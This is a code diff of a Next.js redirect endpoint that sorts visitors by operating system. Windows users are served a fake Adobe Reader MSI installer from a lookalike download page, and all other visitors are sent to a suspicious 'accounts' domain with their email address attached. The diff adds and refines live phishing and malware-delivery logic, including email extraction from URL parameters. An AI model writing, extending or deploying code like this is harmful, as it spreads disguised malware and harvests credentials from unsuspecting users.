@@ -1,26 +1,30 @@
+// pages/api/redirect.js
 export default function handler(req, res) {
   const userAgent = req.headers['user-agent'] || "";
   const isWindows = /windows/i.test(userAgent);
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
   const MSI_PATH = '/Reader_en_install.msi';
-  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=&smn=';
+  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu';
 
-  // Attempt to grab email from query param or manually parse &smn= from URL
+  // 1. Try to get email from query normally
   let email = '';
   if (req.query.email) {
     email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email;
   } else if (req.query.smn) {
     email = Array.isArray(req.query.smn) ? req.query.smn[0] : req.query.smn;
-  } else if (req.url.includes('&smn=')) {
-    // parse manually if URL is like /&smn=email
+  } else if (req.url) {
+    // 2. Fallback: parse &smn=EMAIL even if no preceding ?
     const match = req.url.match(/&smn=([^&]+)/);
-    if (match && match[1]) email = decodeURIComponent(match[1]);
+    if (match && match[1]) {
+      email = decodeURIComponent(match[1]);
+    }
   }
 
   const safeEmail = email ? encodeURIComponent(email) : '';
 
   if (isWindows) {
+    // Windows: trigger MSI download + redirect to Adobe
     const html = `<!DOCTYPE html>
       <html>
         <head><meta charset="utf-8"><title>Download…</title></head>
@@ -43,7 +47,7 @@ export default function handler(req, res) {
     return;
   }
 
-  // Non-Windows redirect with email
+  // Non-Windows: redirect with email
   const finalUrl = safeEmail ? `${NON_WINDOWS_TARGET}?smn=${safeEmail}` : NON_WINDOWS_TARGET;
   res.writeHead(302, { Location: finalUrl });
   res.end();
